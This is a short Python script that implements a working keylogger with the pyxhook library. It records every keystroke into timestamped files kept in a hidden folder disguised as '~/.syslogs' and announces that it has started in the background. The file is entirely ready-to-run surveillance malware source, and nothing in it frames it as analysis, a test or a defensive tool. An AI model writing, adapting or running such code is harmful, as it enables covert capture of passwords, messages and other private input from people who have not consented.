import os
from datetime import datetime
import pyxhook

# Define log directory (hidden folder)
log_dir = os.path.expanduser("~/.syslogs")
os.makedirs(log_dir, exist_ok=True)

# Log file with timestamp
log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.log")

# Function to log keystrokes
def on_key_press(event):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            if event.Ascii == 13:  # Enter key
                f.write("\n")
            elif event.Ascii == 8:  # Backspace
                f.write("[BACKSPACE]")
            elif event.Ascii > 0:
                f.write(chr(event.Ascii))
    except Exception as e:
        print(f"Logging error: {e}")

# Create hook manager
hookman = pyxhook.HookManager()
hookman.KeyDown = on_key_press
hookman.HookKeyboard()

try:
    print("Keylogger started in background...")
    hookman.start()
except KeyboardInterrupt:
    hookman.cancel()
except Exception as e:
    print(f"Error: {e}")

